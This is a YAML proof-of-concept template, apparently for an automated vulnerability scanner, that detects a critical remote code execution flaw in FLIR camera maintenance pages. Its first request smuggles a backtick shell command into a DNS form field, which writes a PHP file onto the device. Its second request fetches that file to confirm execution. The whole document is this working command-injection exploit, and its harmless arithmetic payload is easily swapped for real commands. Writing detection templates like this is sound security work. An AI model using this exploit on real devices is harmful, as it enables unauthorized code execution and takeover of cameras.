name: yaml-poc-flir-camera-rce-CT-655918
binding: faf9c390-1017-43b4-a378-c4e2f2291b88
detail:
    author: haiqing.chen
    vulnerability:
        id: 66cd8c1b-5042-4a95-aa55-8961a0e0a7f5
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /maintenance/controllerFlirSystem.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: dns%5Bdhcp%5D=%60echo+\"<?php+echo+777*4444;?>\">test.php%60&dns%5Bserver1%5D=8.8.8.8&dns%5Bserver2%5D=
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /maintenance/test.php
        expression: response.status == 200 && response.body_string.contains("3452988")
expression: r0() && r1()
